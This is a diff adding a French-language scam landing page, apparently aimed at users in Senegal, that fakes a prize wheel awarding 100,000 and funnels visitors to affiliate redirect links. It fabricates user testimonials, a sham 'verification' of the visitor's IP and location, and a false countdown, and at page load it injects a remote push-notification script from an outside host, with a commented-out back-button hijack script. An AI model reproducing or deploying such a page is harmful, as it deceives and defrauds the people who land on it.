@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="pushsdk" content="d43610b6110f294b1819ca68237a1840">
+
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <meta name="referrer" content="no-referrer">
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+  <title>Félicitations!</title>
+  <meta content="notranslate" name="google">
+	
+  <link rel="stylesheet" type="text/css" href="files/style.css">
+  <link rel="stylesheet" href="files/modal.css">
+  <script src="files/modal.js"></script>
+  <script src="files/jquery.min.js"></script>
+
+
+
+
+
+  
+  <style>
+    #ip_text {
+      display: none;
+    }
+
+    #device_text {
+      display: none;
+    }
+
+    #browser_text {
+      display: none;
+    }
+
+    #loc_text {
+      display: none;
+    }
+
+    #os_text {
+      display: none;
+    }
+
+    #win_text {
+      display: none;
+    }
+
+    #ip_check {
+      display: none;
+    }
+
+    #device_check {
+      display: none;
+    }
+
+    #browser_check {
+      display: none;
+    }
+
+    #loc_check {
+      display: none;
+    }
+
+    #os_check {
+      display: none;
+    }
+  </style>
+  <script>
+    function getURLParameter(name) {
+      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+
+    function dateOffset(f, c) {
+      var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
+        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
+      1 == b && (f = 0);
+
+      var d = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"],
+        g = ["Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"];
+      return null != !c && 0 != !c && void 0 != !c ? h.getDate() + " " + g[h.getMonth()] : "day_name_only" == c && b ?
+        d[h.getDay()] : "top_date" == c && b ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h
+          .getFullYear() : void 0
+    }
+  </script>
+  <script>
+    var days = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"];
+    var months = ["Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"];
+
+    var myDate = new Date();
+    var fullDate = myDate.getDate() + " " + months[myDate.getMonth()] +
+      " " + myDate.getFullYear() + ", " + days[myDate.getDay()];
+
+  </script>
+  <script type="text/javascript">
+    function speak(c) {
+      var b = new SpeechSynthesisUtterance();
+      var a = speechSynthesis.getVoices();
+      b.voice = a[2];
+      b.voiceURI = "native";
+      b.volume = 1;
+      b.rate = 1;
+      b.pitch = 1;
+      b.text = c;
+      b.lang = "en-EN";
+      speechSynthesis.speak(b)
+    }
+    speak("");
+  </script>
+  <meta name="pushsdk" content="0893b74c44fd6e82e423c90165e850bf">
+
+
+
+
+
+
+</head>
+
+<body onload="setButtonHeight(),autospin1()">
+  <div id="header">
+    <span class="menu"></span>
+    <h3><span id="headline">PROGRAMME DE FIDÉLITÉ</span></h3><span class="icon"></span>
+  </div>
+  <div id="container">
+    <div align="center" id="firstpage">
+      <div class="date" id="topDate" style="padding-bottom:10px;margin:0">
+        <script>
+          document.write(fullDate);
+        </script>
+      </div>
+      <div style="margin-bottom:2px">
+        <div id="subheadline">
+          <p style="font-size:18px"><b>Félicitations!</b></p>
+          <p style="padding-top:10px">Aujourd'hui, vous avez de la chance!</p>
+        </div>
+        <div class="intro" style="padding-top:5px">
+          Le <span id="today">
+            <script>
+              document.write(dateOffset(0, "day_name_only"));
+            </script>
+          </span> nous sélectionnons <b>18</b>
+          utilisateurs pour leur donner la chance de gagner des cadeaux de nos sponsors. Faites tourner la roue pour voir quel cadeau vous obtenez!
+        </div>
+        <div id="wheelCon">
+          <img class="spinAround2 transparent" height="540" id="wheel" src="files/roll.png"
+            width="540"> <input id="pressButton" onclick="spin()" style="top: 106.2px;" class="roller-button" type="button">
+          <div><img class="animated rotateIn" id="devMockup" src="files/money.png"
+              style="display: hidden; left: 64px; top: 42px;"></div>
+        </div>
+      </div>
+      <div id="secondpage">
+        <div class="congrats">
+          <h4>
+            <a class="mainButton" href="https://1rzt3x.mcgo2.com/click" style="cursor:pointer!important"
+              preventexitpop="false" rel="noreferrer">
+
+              <font color="#3C5A96">Félicitations!<br> <span style="color: #ff0000;">100,000</span> est presque à vous !</font>
+            </a>
+          </h4>
+        </div>
+        <div class="congrats" style="text-align:center">
+          1. Cliquez sur le bouton "CHOISIR"
+
+
+          <br>2. Vous serez redirigé vers le site de notre sponsor.<br>
+
+          <b><br> <b>Important:</b> Dépêchez-vous, quantités limitées disponibles.</b>
+        </div>
+        <div class="timer">Vous avez seulement
+          <font color="red"><b><span id="mins">4</span> minutes et <span id="hsecs">59</span> seconds</b></font> pour réclamer votre prix!
+        </div>
+        <div class="prize">
+          <table align="center">
+            <tbody>
+              <tr>
+                <th></th>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img
+                    src="files/money-2.png" style="max-width:170px"></td>
+                <td style="line-height:1.6">
+                  <p style="text-align:left"><a class="mainButton" href="https://1rzt3x.mcgo2.com/click"
+                      style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"><span class="name">100,000</span></a></p>
+                  
+                  <div>
+                    <a class="button mainButton" href="https://1rzt3x.mcgo2.com/click"
+                      style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"> CHOISIR </a>
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        
+       
+      </div>
+    </div>
+    <div class="container">
+      <div class="comments">
+        <div class="wi_like_wrap border_bottom">
+          <span class="like_people"><span class="like_people_images"><span class="like_people_image_wrap"><img
+                  class="like_people_image" height="24" src="files/615ef34722a34.jpg"
+                  width="24"></span> <span class="like_people_image_wrap"><img class="like_people_image" height="24"
+                  src="files/615ef34722a47.jpg" width="24"></span></span>
+            <span class="like_people_text">1537 personnes l'ont aimé</span></span>
+
+
+        </div>
+
+        <div class="wi_buttons border_bottom">
+          <div class="wi_buttons_wrap">
+            <span class="like_wrap"><span class="item_like _i"><i class="i_like"></i> <b class="v_like">1537</b></span>
+              <span class="item_share is_empty _i"><i class="i_share"></i> <b class="v_share">234</b></span></span>
+            <span class="item_views"><i class="i_views"></i> <b class="v_views">544K</b></span>
+          </div>
+        </div>
+
+
+
+
+        <center>
+          <font face="arial"></font>
+          <table border="0" cellpadding="4" cellspacing="0" style="padding-top:10px;font-size:13px" width="100%">
+            <tbody id="comments_list">
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="files/1m.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Khadija Cissé</div>
+                  <div class="comment_text">Je me suis réveillé avec un message disant que j'avais gagné 100000. La meilleure matinée de tous les temps ! </div>
+
+                  
+                  <div class="comments__item__meta">
+                    <div class="item_date">Hier в 08:13
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Comme</span></span> <span class="pi_reply_wrap">·
+                      <span>Répondre</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="files/2m.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Ousmane Camara</div>
+                  <div class="comment_text">J'ai eu de la chance et j'ai gagné 70000, mais mon frère n'a rien gagné. Tant pis, je lui achèterai quelque chose.
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Comme</span></span> <span class="pi_reply_wrap">·
+                      <span>Répondre</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="files/3m.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Astou Seck</div>
+                  <div class="comment_text">Comment se fait-il que una obtienne beaucoup, alors que je n'obtiens que 70000.
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Comme</span></span> <span class="pi_reply_wrap">·
+                      <span>Répondre</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="files/1w.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Ibrahima Diallo</div>
+                  <div class="comment_text">J'ai eu de la chance, car seules dix personnes gagnent chaque jour.
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Comme</span></span> <span class="pi_reply_wrap">·
+                      <span>Répondre</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="files/3w.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Mariama Faye</div>
+                  <div class="comment_text">C'était facile, j'espère que j'obtiendrai les 100000 ...
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(3));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Comme</span></span> <span class="pi_reply_wrap">·
+                      <span>Répondre</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="files/4m.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Awa Ndiaye</div>
+                  <div class="comment_text">Merci pour le cadeau d'anniversaire de mon frère. C'est une vraie chance.
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(4));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Comme</span></span> <span class="pi_reply_wrap">·
+                      <span>Répondre</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <div class="show_next_wrap">
+            <span class="show_next">Voir tous</span>
+
+          </div>
+        </center>
+      </div>
+    </div>
+    <div class="fixed_footer"><img alt="" class="clip" src="files/615ef34722ad6.png"> <input
+        class="footer_input" placeholder="Your message" type="text"> <img alt="" class="btn_send"
+        src="files/615ef34722ae5.png">
+
+    </div>
+
+  </div>
+
+
+  <script type="text/javascript">
+    var page = ("page"),
+      brand = ("device_brand");
+
+    var conMid, mydate = new Date,
+      year = mydate.getFullYear(),
+      month = mydate.getMonth(),
+      day = mydate.getDate(),
+      weekday = mydate.getDay(),
+      count = 1,
+      headline = document.getElementById("headline"),
+      topDate = document.getElementById("topDate"),
+      today = document.getElementById("today"),
+      con = document.getElementById("container"),
+      whCon = document.getElementById("wheelCon"),
+      dWheel = document.getElementById("wheel"),
+      button = document.getElementById("pressButton"),
+      device = document.getElementById("devMockup"),
+      first = document.getElementById("firstpage"),
+      second = document.getElementById("secondpage");
+
+    function setButtonHeight() {
+      conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top =
+        conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+    }
+
+    function spin() {
+      var modal = $modal({
+
+        content: '<p style="text-align:center;"></p><br><p style="text-align:center;">Veuillez réessayer !</p>',
+
+      });
+      switch (count) {
+
+        case 1:
+          button.disabled = !0, dWheel.className = "spinAround", setTimeout(function () {
+            button.disabled = !1, modal.show(), $('.modal__btn-close').click(function () { autospin2() });
+          }, 6800);
+          break;
+        case 2:
+          dWheel.className = "spinAround2", setTimeout(function () {
+            dWheel.className = dWheel.className + " transparent"
+          }, 6800), setTimeout(function () {
+            device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 +
+              "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+          }, 7000), setTimeout(function () {
+            first.innerHTML = "<img src='files/loading.gif'>", first.style.padding = "195px 0px", setTimeout(function () {
+              first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con
+                .firstChild), setInterval("countdown()", 1000)
+            }, 1500)
+          }, 9000)
+          confetti.clear();
+          document.getElementById('my-canvas').remove();
+
+      }
+      count++
+    }
+
+    function autospin2() {
+      spin()
+    }
+
+
+    function autospin1() {
+      var modal = $modal({
+
+        content: '<p style="text-align:center;">Félicitations ! Vous avez été choisi(e) !</p><br><p id="ip_text" style="text-align:center; font-size: 13px;"><b>IP: 95.143.118.90</b> <img id="ip_check" src="files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="device_text" style="text-align:center; font-size: 13px;"><b>Appareil : téléphone mobile</b> <img id="device_check" src="files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="browser_text" style="text-align:center; font-size: 13px;"><b>Navigateur </b> <img id="browser_check" src="files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="loc_text" style="text-align:center; font-size: 13px;"><b>Localisation : Sénégal </b> <img id="loc_check" src="files/check_icon.png" width="10" height="10"" alt="check"></p><br><p id="os_text" style="text-align:center; font-size: 13px;"><b>Vérification effectuée </b> <img id="os_check"src="files/check_icon.png" width="10" height="10"" alt="check"></p><br><p style="text-align:center;">Vous êtes </p><br><p style="text-align:center;">✅ Gagnez <strong>100,000</strong></p><br> <p style="text-align:center;">Cliquez sur "OK" pour commencer !</p>',
+
+      });
+      modal.show();
+      $("#ip_text").show('slow');
+      setTimeout(function () { $("ip_text").hide('slow'); }, 500);
+
+      $("#device_text").show('slow');
+      setTimeout(function () { $("device_text").hide('slow'); }, 1000);
+
+      $("#browser_text").show('slow');
+      setTimeout(function () { $("browser_text").hide('slow'); }, 3000);
+
+      $("#loc_text").show('slow');
+      setTimeout(function () { $("loc_text").hide('slow'); }, 3500);
+
+      $("#os_text").show('slow');
+      setTimeout(function () { $("os_text").hide('slow'); }, 4500);
+
+
+      setTimeout(function () { $('#ip_check').fadeIn(100); }, 1500);
+      setTimeout(function () { $('#device_check').fadeIn(100); }, 2000);
+      setTimeout(function () { $('#browser_check').fadeIn(100); }, 4000);
+      setTimeout(function () { $('#loc_check').fadeIn(100); }, 4500);
+      setTimeout(function () { $('#os_check').fadeIn(100); }, 5100);
+
+
+      $('.modal__btn-close').click(function () {
+        document.getElementById("pressButton").click()
+      });
+
+    }
+
+    function countdown() {
+      var d = parseInt(document.getElementById("mins").innerHTML),
+        c = parseInt(document.getElementById("hsecs").innerHTML),
+        b = 0,
+        a = 0;
+      0 !== d && 0 === c ? (b = d - 1, a = 59) : 0 !== d || 0 !== c ? (b = d, a = c - 1) : 0 === d && 0 === c && (b = d,
+        a = c), a < 10 && (a = "0" + a), document.getElementById("mins").textContent = b, document.getElementById(
+          "hsecs").textContent = a
+    };
+  </script>
+  <script src="files/6156e5fb2308d.js"></script>
+  <canvas id="my-canvas" style="position:absolute; top:0; width: 100%;"  height="880"></canvas>
+  <button id="show-modal" class="btn"></button>
+  <script>
+    var confettiSettings = { target: 'my-canvas' };
+    var confetti = new ConfettiGenerator(confettiSettings);
+    confetti.render();
+  </script>
+  
+  <script>
+  var cta = 'mainButton';
+  var urlParams = new URLSearchParams(window.location.search);
+  
+  //var back = 'https://m.bolomobi.com/c/c/201/4847?sc=bbr&'+urlParams.toString()
+  //var back = 'https://1rzt3x.mcgo2.com/offer/E6Hil12Y?sc=bbr_2&'+urlParams.toString()
+  var back = 'https://1rzt3x.mcgo2.com/visit/bf045520-67d6-45c6-903c-65cf5635530f?sc=bbr_2&'+urlParams.toString()
+  var under = 'https://1rzt3x.mcgo2.com/click?sc=u&'+urlParams.toString()
+  //var back = 'https://1rzt3x.mcgo2.com/click?sc=bbr&'+urlParams.toString()
+    //var back = 'https://m.bolo2vas23.click/c/n/249316/4847?sc=bbr&'+urlParams.toString()
+    // var back = 'https://jiangdhfds.xyz/ctrel5k.php?key=hy0t59vj8u77nwfow978&visitor_id=${SUBID}&cost={cost}&zoneid={zoneid}&campaignid={campaignid}&device={device}&browser={browser}&os={os}&osversion={osversion}&country={country}&language={language}&isp={isp}&user_activity={user_activity}';
+  
+	
+  var aElements = document.getElementsByTagName('a');
+  console.log(aElements)
+  for (var i = 0; i < aElements.length; i++) {
+	var aElement = aElements[i];
+		var href = aElement.getAttribute('href');
+		if (!aElement.hasAttribute('href')) {
+			continue;  // 跳过没有 href 属性的 <a> 标签
+		}
+		// 在 URL 的查询字符串之前添加一个 "?"
+		if (urlParams.toString()) {
+			href += (href.includes('?') ? '&' : '?') + urlParams.toString();
+		}
+		aElement.setAttribute('href', href);
+    }
+</script>
+<script src="script.js"></script>
+
+  <!-- 
+  <script>
+      var Back_Button_Zone = 7923699;
+      var Domain_TB = "glistool.net";
+</script>
+<script async src="https://desenteir.com/act/files/reverse.min.js?sf=1"></script>
+-->
+
+  <!-- propush-->
+<script>
+    var s = document.createElement('script');
+    s.src='//sabonakapona.com/act/files/micro.tag.min.js?z=7962556'+'&sw=/sw-check-permissions-e230f.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    };
+    document.head.appendChild(s);
+</script>
+
+
+</body>
+
+</html>
